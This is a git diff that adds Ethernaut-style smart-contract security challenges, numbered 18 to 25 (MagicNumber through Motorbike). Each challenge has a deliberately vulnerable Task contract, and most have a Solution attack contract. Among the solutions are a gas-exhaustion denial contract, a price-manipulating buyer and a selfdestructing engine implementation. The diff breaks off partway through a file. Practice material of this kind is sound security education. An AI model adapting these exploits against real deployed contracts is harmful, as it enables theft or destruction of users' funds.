+[32m+[m
+[32m+[m[32m// contract Recovery {[m
+[32m+[m
+[32m+[m[32m//   //generate tokens[m
+[32m+[m[32m//   function generateToken(string memory _name, uint256 _initialSupply) public {[m
+[32m+[m[32m//     new SimpleToken(_name, msg.sender, _initialSupply);[m
+[32m+[m[41m  [m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+[32m+[m
+[32m+[m[32m// contract SimpleToken {[m
+[32m+[m
+[32m+[m[32m//   string public name;[m
+[32m+[m[32m//   mapping (address => uint) public balances;[m
+[32m+[m
+[32m+[m[32m//   // constructor[m
+[32m+[m[32m//   constructor(string memory _name, address _creator, uint256 _initialSupply) {[m
+[32m+[m[32m//     name = _name;[m
+[32m+[m[32m//     balances[_creator] = _initialSupply;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   // collect ether in return for tokens[m
+[32m+[m[32m//   receive() external payable {[m
+[32m+[m[32m//     balances[msg.sender] = msg.value * 10;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   // allow transfers of tokens[m
+[32m+[m[32m//   function transfer(address _to, uint _amount) public {[m[41m [m
+[32m+[m[32m//     require(balances[msg.sender] >= _amount);[m
+[32m+[m[32m//     balances[msg.sender] = balances[msg.sender] - _amount;[m
+[32m+[m[32m//     balances[_to] = _amount;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   // clean up after ourselves[m
+[32m+[m[32m//   function destroy(address payable _to) public {[m
+[32m+[m[32m//     selfdestruct(_to);[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+[1mdiff --git a/src/18MagicNumber/Solution.sol b/src/18MagicNumber/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..ef11002[m
+[1m--- /dev/null[m
+[1m+++ b/src/18MagicNumber/Solution.sol[m
+[36m@@ -0,0 +1,15 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// contract Solver {[m
+[32m+[m
+[32m+[m[32m//   constructor() {}[m
+[32m+[m
+[32m+[m[32m//   function whatIsTheMeaningOfLife() public pure returns (uint) {[m
+[32m+[m[32m//     assembly {[m
+[32m+[m[32m//       mstore(0x0, 42)[m
+[32m+[m[32m//       return(0x0, 32)[m
+[32m+[m[32m//     }[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/18MagicNumber/Task.sol b/src/18MagicNumber/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..8a28c0e[m
+[1m--- /dev/null[m
+[1m+++ b/src/18MagicNumber/Task.sol[m
+[36m@@ -0,0 +1,25 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// contract MagicNum {[m
+[32m+[m
+[32m+[m[32m//   address public solver;[m
+[32m+[m
+[32m+[m[32m//   constructor() {}[m
+[32m+[m
+[32m+[m[32m//   function setSolver(address _solver) public {[m
+[32m+[m[32m//     solver = _solver;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   /*[m
+[32m+[m[32m//     ____________/\\\_______/\\\\\\\\\_____[m[41m        [m
+[32m+[m[32m//      __________/\\\\\_____/\\\///////\\\___[m[41m       [m
+[32m+[m[32m//       ________/\\\/\\\____\///______\//\\\__[m[41m      [m
+[32m+[m[32m//        ______/\\\/\/\\\______________/\\\/___[m[41m     [m
+[32m+[m[32m//         ____/\\\/__\/\\\___________/\\\//_____[m[41m    [m
+[32m+[m[32m//          __/\\\\\\\\\\\\\\\\_____/\\\//________[m[41m   [m
+[32m+[m[32m//           _\///////////\\\//____/\\\/___________[m[41m  [m
+[32m+[m[32m//            ___________\/\\\_____/\\\\\\\\\\\\\\\_[m[41m [m
+[32m+[m[32m//             ___________\///_____\///////////////__[m
+[32m+[m[32m//   */[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/19Alien/Solution.sol b/src/19Alien/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..e7cc37f[m
+[1m--- /dev/null[m
+[1m+++ b/src/19Alien/Solution.sol[m
+[36m@@ -0,0 +1,19 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// contract GetSlotLocation {[m
+[32m+[m
+[32m+[m[32m//    constructor() {}[m[41m   [m
+[32m+[m
+[32m+[m[32m// function getSlotWithIndex(uint256 arraySlot, uint256 index) public pure returns (uint256 storageSlot) {[m
+[32m+[m[32m//         storageSlot= uint256(keccak256(abi.encodePacked(arraySlot))) + index;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m// function getIndexWithSlot(uint256 storageSlot) public pure returns (uint256 index) {[m
+[32m+[m[32m//         index = type(uint256).max - storageSlot;[m
+[32m+[m[32m//     }[m
+[32m+[m[32m// }[m
+[32m+[m
+[32m+[m
+[32m+[m
+[32m+[m[32m// // https://ethereum.stackexchange.com/questions/106526/how-to-locate-value-from-dynamic-array-in-the-storage[m
+\ No newline at end of file[m
+[1mdiff --git a/src/19Alien/Task.sol b/src/19Alien/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..5a8da0a[m
+[1m--- /dev/null[m
+[1m+++ b/src/19Alien/Task.sol[m
+[36m@@ -0,0 +1,31 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.5.0;[m
+[32m+[m
+[32m+[m[32m// import '../helpers/Ownable-05.sol';[m
+[32m+[m
+[32m+[m[32m// contract AlienCodex is Ownable {[m
+[32m+[m
+[32m+[m[32m//   bool public contact;[m
+[32m+[m[32m//   bytes32[] public codex;[m
+[32m+[m
+[32m+[m[32m//   modifier contacted() {[m
+[32m+[m[32m//     assert(contact);[m
+[32m+[m[32m//     _;[m
+[32m+[m[32m//   }[m
+[32m+[m[41m  [m
+[32m+[m[32m//   function makeContact() public {[m
+[32m+[m[32m//     contact = true;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function record(bytes32 _content) contacted public {[m
+[32m+[m[32m//     codex.push(_content);[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function retract() contacted public {[m
+[32m+[m[32m//     codex.length--;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function revise(uint i, bytes32 _content) contacted public {[m
+[32m+[m[32m//     codex[i] = _content;[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/20Denial/Solution.sol b/src/20Denial/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..148a6f9[m
+[1m--- /dev/null[m
+[1m+++ b/src/20Denial/Solution.sol[m
+[36m@@ -0,0 +1,18 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import './Task.sol';[m
+[32m+[m
+[32m+[m[32m// contract DenialSolution {[m
+[32m+[m
+[32m+[m[32m//     uint256[] list;[m
+[32m+[m[41m   [m
+[32m+[m[32m//     constructor() {}[m
+[32m+[m
+[32m+[m[32m//     receive() external payable {[m
+[32m+[m[32m//         for (uint256 i = 0; i < type(uint256).max; i++ ) {[m
+[32m+[m[32m//             list.push(i);[m
+[32m+[m[32m//         }[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/20Denial/Task.sol b/src/20Denial/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..d4164d3[m
+[1m--- /dev/null[m
+[1m+++ b/src/20Denial/Task.sol[m
+[36m@@ -0,0 +1,33 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m[32m// contract Denial {[m
+[32m+[m
+[32m+[m[32m//     address public partner; // withdrawal partner - pay the gas, split the withdraw[m
+[32m+[m[32m//     address public constant owner = address(0xA9E);[m
+[32m+[m[32m//     uint timeLastWithdrawn;[m
+[32m+[m[32m//     mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances[m
+[32m+[m
+[32m+[m[32m//     function setWithdrawPartner(address _partner) public {[m
+[32m+[m[32m//         partner = _partner;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     // withdraw 1% to recipient and 1% to owner[m
+[32m+[m[32m//     function withdraw() public {[m
+[32m+[m[32m//         uint amountToSend = address(this).balance / 100;[m
+[32m+[m[32m//         // perform a call without checking return[m
+[32m+[m[32m//         // The recipient can revert, the owner will still get their share[m
+[32m+[m[32m//         partner.call{value:amountToSend}("");[m
+[32m+[m[32m//         payable(owner).transfer(amountToSend);[m
+[32m+[m[32m//         // keep track of last withdrawal time[m
+[32m+[m[32m//         timeLastWithdrawn = block.timestamp;[m
+[32m+[m[32m//         withdrawPartnerBalances[partner] +=  amountToSend;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     // allow deposit of funds[m
+[32m+[m[32m//     receive() external payable {}[m
+[32m+[m
+[32m+[m[32m//     // convenience function[m
+[32m+[m[32m//     function contractBalance() public view returns (uint) {[m
+[32m+[m[32m//         return address(this).balance;[m
+[32m+[m[32m//     }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/21Shop/Solution.sol b/src/21Shop/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..5599afd[m
+[1m--- /dev/null[m
+[1m+++ b/src/21Shop/Solution.sol[m
+[36m@@ -0,0 +1,30 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import './Task.sol';[m
+[32m+[m
+[32m+[m[32m// contract ShopSolution {[m
+[32m+[m
+[32m+[m[32m//     Shop public victim;[m
+[32m+[m
+[32m+[m[32m//     constructor(address _shop) {[m
+[32m+[m[32m//         victim = Shop(_shop);[m
+[32m+[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function getVictimStatus () public view returns (bool) {[m
+[32m+[m[32m//         return victim.isSold();[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function price() external view returns (uint) {[m
+[32m+[m[32m//         if (victim.isSold()) {[m
+[32m+[m[32m//             return 1;[m
+[32m+[m[32m//         }[m
+[32m+[m[32m//             return 2000;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function attackBuy() public {[m
+[32m+[m[32m//         victim.buy();[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/21Shop/Task.sol b/src/21Shop/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..11604e6[m
+[1m--- /dev/null[m
+[1m+++ b/src/21Shop/Task.sol[m
+[36m@@ -0,0 +1,20 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// interface Buyer {[m
+[32m+[m[32m//   function price() external view returns (uint);[m
+[32m+[m[32m// }[m
+[32m+[m
+[32m+[m[32m// contract Shop {[m
+[32m+[m[32m//   uint public price = 100;[m
+[32m+[m[32m//   bool public isSold;[m
+[32m+[m
+[32m+[m[32m//   function buy() public {[m
+[32m+[m[32m//     Buyer _buyer = Buyer(msg.sender);[m
+[32m+[m
+[32m+[m[32m//     if (_buyer.price() >= price && !isSold) {[m
+[32m+[m[32m//       isSold = true;[m
+[32m+[m[32m//       price = _buyer.price();[m
+[32m+[m[32m//     }[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/22DEX/Task.sol b/src/22DEX/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..c48b16a[m
+[1m--- /dev/null[m
+[1m+++ b/src/22DEX/Task.sol[m
+[36m@@ -0,0 +1,56 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";[m
+[32m+[m[32m// import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";[m
+[32m+[m[32m// import 'openzeppelin-contracts-08/access/Ownable.sol';[m
+[32m+[m
+[32m+[m[32m// contract Dex is Ownable {[m
+[32m+[m[32m//   address public token1;[m
+[32m+[m[32m//   address public token2;[m
+[32m+[m[32m//   constructor() {}[m
+[32m+[m
+[32m+[m[32m//   function setTokens(address _token1, address _token2) public onlyOwner {[m
+[32m+[m[32m//     token1 = _token1;[m
+[32m+[m[32m//     token2 = _token2;[m
+[32m+[m[32m//   }[m
+[32m+[m[41m  [m
+[32m+[m[32m//   function addLiquidity(address token_address, uint amount) public onlyOwner {[m
+[32m+[m[32m//     IERC20(token_address).transferFrom(msg.sender, address(this), amount);[m
+[32m+[m[32m//   }[m
+[32m+[m[41m  [m
+[32m+[m[32m//   function swap(address from, address to, uint amount) public {[m
+[32m+[m[32m//     require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");[m
+[32m+[m[32m//     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");[m
+[32m+[m[32m//     uint swapAmount = getSwapPrice(from, to, amount);[m
+[32m+[m[32m//     IERC20(from).transferFrom(msg.sender, address(this), amount);[m
+[32m+[m[32m//     IERC20(to).approve(address(this), swapAmount);[m
+[32m+[m[32m//     IERC20(to).transferFrom(address(this), msg.sender, swapAmount);[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function getSwapPrice(address from, address to, uint amount) public view returns(uint){[m
+[32m+[m[32m//     return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function approve(address spender, uint amount) public {[m
+[32m+[m[32m//     SwappableToken(token1).approve(msg.sender, spender, amount);[m
+[32m+[m[32m//     SwappableToken(token2).approve(msg.sender, spender, amount);[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function balanceOf(address token, address account) public view returns (uint){[m
+[32m+[m[32m//     return IERC20(token).balanceOf(account);[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+[32m+[m
+[32m+[m[32m// contract SwappableToken is ERC20 {[m
+[32m+[m[32m//   address private _dex;[m
+[32m+[m[32m//   constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {[m
+[32m+[m[32m//         _mint(msg.sender, initialSupply);[m
+[32m+[m[32m//         _dex = dexInstance;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function approve(address owner, address spender, uint256 amount) public {[m
+[32m+[m[32m//     require(owner != _dex, "InvalidApprover");[m
+[32m+[m[32m//     super._approve(owner, spender, amount);[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/23Dex2/Solution.sol b/src/23Dex2/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..fe23abf[m
+[1m--- /dev/null[m
+[1m+++ b/src/23Dex2/Solution.sol[m
+[36m@@ -0,0 +1,11 @@[m
+[32m+[m[32m// // contracts/GLDToken.sol[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import "@openzeppelin/token/ERC20/ERC20.sol";[m
+[32m+[m
+[32m+[m[32m// contract GLDToken is ERC20 {[m
+[32m+[m[32m//     constructor(uint256 initialSupply) ERC20("Gold", "GLD") {[m
+[32m+[m[32m//         _mint(msg.sender, initialSupply);[m
+[32m+[m[32m//     }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/23Dex2/Task.sol b/src/23Dex2/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..bfd5a35[m
+[1m--- /dev/null[m
+[1m+++ b/src/23Dex2/Task.sol[m
+[36m@@ -0,0 +1,55 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32m// import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";[m
+[32m+[m[32m// import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";[m
+[32m+[m[32m// import 'openzeppelin-contracts-08/access/Ownable.sol';[m
+[32m+[m
+[32m+[m[32m// contract DexTwo is Ownable {[m
+[32m+[m[32m//   address public token1;[m
+[32m+[m[32m//   address public token2;[m
+[32m+[m[32m//   constructor() {}[m
+[32m+[m
+[32m+[m[32m//   function setTokens(address _token1, address _token2) public onlyOwner {[m
+[32m+[m[32m//     token1 = _token1;[m
+[32m+[m[32m//     token2 = _token2;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function add_liquidity(address token_address, uint amount) public onlyOwner {[m
+[32m+[m[32m//     IERC20(token_address).transferFrom(msg.sender, address(this), amount);[m
+[32m+[m[32m//   }[m
+[32m+[m[41m  [m
+[32m+[m[32m//   function swap(address from, address to, uint amount) public {[m
+[32m+[m[32m//     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");[m
+[32m+[m[32m//     uint swapAmount = getSwapAmount(from, to, amount);[m
+[32m+[m[32m//     IERC20(from).transferFrom(msg.sender, address(this), amount);[m
+[32m+[m[32m//     IERC20(to).approve(address(this), swapAmount);[m
+[32m+[m[32m//     IERC20(to).transferFrom(address(this), msg.sender, swapAmount);[m
+[32m+[m[32m//   }[m[41m [m
+[32m+[m
+[32m+[m[32m//   function getSwapAmount(address from, address to, uint amount) public view returns(uint){[m
+[32m+[m[32m//     return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function approve(address spender, uint amount) public {[m
+[32m+[m[32m//     SwappableTokenTwo(token1).approve(msg.sender, spender, amount);[m
+[32m+[m[32m//     SwappableTokenTwo(token2).approve(msg.sender, spender, amount);[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function balanceOf(address token, address account) public view returns (uint){[m
+[32m+[m[32m//     return IERC20(token).balanceOf(account);[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+[32m+[m
+[32m+[m[32m// contract SwappableTokenTwo is ERC20 {[m
+[32m+[m[32m//   address private _dex;[m
+[32m+[m[32m//   constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {[m
+[32m+[m[32m//         _mint(msg.sender, initialSupply);[m
+[32m+[m[32m//         _dex = dexInstance;[m
+[32m+[m[32m//   }[m
+[32m+[m
+[32m+[m[32m//   function approve(address owner, address spender, uint256 amount) public {[m
+[32m+[m[32m//     require(owner != _dex, "InvalidApprover");[m
+[32m+[m[32m//     super._approve(owner, spender, amount);[m
+[32m+[m[32m//   }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/24Puzzle/Task.sol b/src/24Puzzle/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..a69e820[m
+[1m--- /dev/null[m
+[1m+++ b/src/24Puzzle/Task.sol[m
+[36m@@ -0,0 +1,90 @@[m
+[32m+[m[32m// // SPDX-License-Identifier: MIT[m
+[32m+[m[32m// pragma solidity ^0.8.0;[m
+[32m+[m[32m// pragma experimental ABIEncoderV2;[m
+[32m+[m
+[32m+[m[32m// import "../helpers/UpgradeableProxy-08.sol";[m
+[32m+[m
+[32m+[m[32m// contract PuzzleProxy is UpgradeableProxy {[m
+[32m+[m[32m//     address public pendingAdmin;[m
+[32m+[m[32m//     address public admin;[m
+[32m+[m
+[32m+[m[32m//     constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {[m
+[32m+[m[32m//         admin = _admin;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     modifier onlyAdmin {[m
+[32m+[m[32m//       require(msg.sender == admin, "Caller is not the admin");[m
+[32m+[m[32m//       _;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function proposeNewAdmin(address _newAdmin) external {[m
+[32m+[m[32m//         pendingAdmin = _newAdmin;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function approveNewAdmin(address _expectedAdmin) external onlyAdmin {[m
+[32m+[m[32m//         require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");[m
+[32m+[m[32m//         admin = pendingAdmin;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function upgradeTo(address _newImplementation) external onlyAdmin {[m
+[32m+[m[32m//         _upgradeTo(_newImplementation);[m
+[32m+[m[32m//     }[m
+[32m+[m[32m// }[m
+[32m+[m
+[32m+[m[32m// contract PuzzleWallet {[m
+[32m+[m[32m//     address public owner;[m
+[32m+[m[32m//     uint256 public maxBalance;[m
+[32m+[m[32m//     mapping(address => bool) public whitelisted;[m
+[32m+[m[32m//     mapping(address => uint256) public balances;[m
+[32m+[m
+[32m+[m[32m//     function init(uint256 _maxBalance) public {[m
+[32m+[m[32m//         require(maxBalance == 0, "Already initialized");[m
+[32m+[m[32m//         maxBalance = _maxBalance;[m
+[32m+[m[32m//         owner = msg.sender;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     modifier onlyWhitelisted {[m
+[32m+[m[32m//         require(whitelisted[msg.sender], "Not whitelisted");[m
+[32m+[m[32m//         _;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {[m
+[32m+[m[32m//       require(address(this).balance == 0, "Contract balance is not 0");[m
+[32m+[m[32m//       maxBalance = _maxBalance;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function addToWhitelist(address addr) external {[m
+[32m+[m[32m//         require(msg.sender == owner, "Not the owner");[m
+[32m+[m[32m//         whitelisted[addr] = true;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function deposit() external payable onlyWhitelisted {[m
+[32m+[m[32m//       require(address(this).balance <= maxBalance, "Max balance reached");[m
+[32m+[m[32m//       balances[msg.sender] += msg.value;[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {[m
+[32m+[m[32m//         require(balances[msg.sender] >= value, "Insufficient balance");[m
+[32m+[m[32m//         balances[msg.sender] -= value;[m
+[32m+[m[32m//         (bool success, ) = to.call{ value: value }(data);[m
+[32m+[m[32m//         require(success, "Execution failed");[m
+[32m+[m[32m//     }[m
+[32m+[m
+[32m+[m[32m//     function multicall(bytes[] calldata data) external payable onlyWhitelisted {[m
+[32m+[m[32m//         bool depositCalled = false;[m
+[32m+[m[32m//         for (uint256 i = 0; i < data.length; i++) {[m
+[32m+[m[32m//             bytes memory _data = data[i];[m
+[32m+[m[32m//             bytes4 selector;[m
+[32m+[m[32m//             assembly {[m
+[32m+[m[32m//                 selector := mload(add(_data, 32))[m
+[32m+[m[32m//             }[m
+[32m+[m[32m//             if (selector == this.deposit.selector) {[m
+[32m+[m[32m//                 require(!depositCalled, "Deposit can only be called once");[m
+[32m+[m[32m//                 // Protect against reusing msg.value[m
+[32m+[m[32m//                 depositCalled = true;[m
+[32m+[m[32m//             }[m
+[32m+[m[32m//             (bool success, ) = address(this).delegatecall(data[i]);[m
+[32m+[m[32m//             require(success, "Error while delegating call");[m
+[32m+[m[32m//         }[m
+[32m+[m[32m//     }[m
+[32m+[m[32m// }[m
+\ No newline at end of file[m
+[1mdiff --git a/src/25Motorbyke/Solution.sol b/src/25Motorbyke/Solution.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..449f203[m
+[1m--- /dev/null[m
+[1m+++ b/src/25Motorbyke/Solution.sol[m
+[36m@@ -0,0 +1,15 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m[32mpragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32mimport "@openzeppelin/utils/Address.sol";[m
+[32m+[m[32mimport "@openzeppelin/proxy/utils/Initializable.sol";[m
+[32m+[m[32mimport "./Task.sol";[m
+[32m+[m
+[32m+[m[32mcontract NewEngine is Initializable {[m
+[32m+[m[32m    constructor() public { }[m
+[32m+[m
+[32m+[m[32m    function destruct() payable public {[m
+[32m+[m[32m        selfdestruct(payable(0));[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m}[m
+\ No newline at end of file[m
+[1mdiff --git a/src/25Motorbyke/Task.sol b/src/25Motorbyke/Task.sol[m
+[1mnew file mode 100644[m
+[1mindex 0000000..2abc8cd[m
+[1m--- /dev/null[m
+[1m+++ b/src/25Motorbyke/Task.sol[m
+[36m@@ -0,0 +1,104 @@[m
+[32m+[m[32m// SPDX-License-Identifier: MIT[m
+[32m+[m
+[32m+[m[32mpragma solidity ^0.8.0;[m
+[32m+[m
+[32m+[m[32mimport "@openzeppelin/utils/Address.sol";[m
+[32m+[m[32mimport "@openzeppelin/proxy/utils/Initializable.sol";[m
+[32m+[m
+[32m+[m[32mcontract Motorbike {[m
+[32m+[m[32m    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1[m
+[32m+[m[32m    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;[m
+[32m+[m[41m    [m
+[32m+[m[32m    struct AddressSlot {[m
+[32m+[m[32m        address value;[m
+[32m+[m[32m    }[m
+[32m+[m[41m    [m
+[32m+[m[32m    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.[m
+[32m+[m[32m    constructor(address _logic) public {[m
+[32m+[m[32m        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");[m
+[32m+[m[32m        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;[m
+[32m+[m[32m        (bool success,) = _logic.delegatecall([m
+[32m+[m[32m            abi.encodeWithSignature("initialize()")[m
+[32m+[m[32m        );[m
+[32m+[m[32m        require(success, "Call failed");[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    // Delegates the current call to `implementation`.[m
+[32m+[m[32m    function _delegate(address implementation) internal virtual {[m
+[32m+[m[32m        // solhint-disable-next-line no-inline-assembly[m
+[32m+[m[32m        assembly {[m
+[32m+[m[32m            calldatacopy(0, 0, calldatasize())[m
+[32m+[m[32m            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)[m
+[32m+[m[32m            returndatacopy(0, 0, returndatasize())[m
+[32m+[m[32m            switch result[m
+[32m+[m[32m            case 0 { revert(0, returndatasize()) }[m
+[32m+[m[32m            default { return(0, returndatasize()) }[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    // Fallback function that delegates calls to the address returned by `_implementation()`.[m[41m [m
+[32m+[m[32m    // Will run if no other function in the contract matches the call data[m
+[32m+[m[32m    fallback () external payable virtual {[m
+[32m+[m[32m        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    // Returns an `AddressSlot` with member `value` located at `slot`.[m
+[32m+[m[32m    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {[m
+[32m+[m[32m        assembly {[m
+[32m+[m[32m            r.slot := slot[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32mcontract Engine is Initializable {[m
+[32m+[m[32m    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1[m
+[32m+[m[32m    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;[m
+[32m+[m
+[32m+[m[32m    address public upgrader;[m
+[32m+[m[32m    uint256 public horsePower;[m
+[32m+[m
+[32m+[m[32m    struct AddressSlot {[m
+[32m+[m[32m        address value;[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    function initialize() external initializer {[m
+[32m+[m[32m        horsePower = 1000;[m
+[32m+[m[32m        upgrader = msg.sender;[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    // Upgrade the implementation of the proxy to `newImplementation`[m
+[32m+[m[32m    // subsequently execute the function call[m
+[32m+[m[32m    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {[m
+[32m+[m[32m        _authorizeUpgrade();[m
+[32m+[m[32m        _upgradeToAndCall(newImplementation, data);[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    // Restrict to upgrader role[m
+[32m+[m[32m    function _authorizeUpgrade() internal view {[m
+[32m+[m[32m        require(msg.sender == upgrader, "Can't upgrade");[m
+[32m+[m[32m    }[m
+[32m+[m
+[32m+[m[32m    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.[m
+[32m+[m[32m    function _upgradeToAndCall([m
+[32m+[m[32m        address newImplementation,[m
+[32m+[m[32m        bytes memory data[m
+[32m+[m[32m    ) internal {[m
+[32m+[m[32m        // Initial upgrade and setup call[m
+[32m+[m[32m        _setImplementation(newImplementation);[m
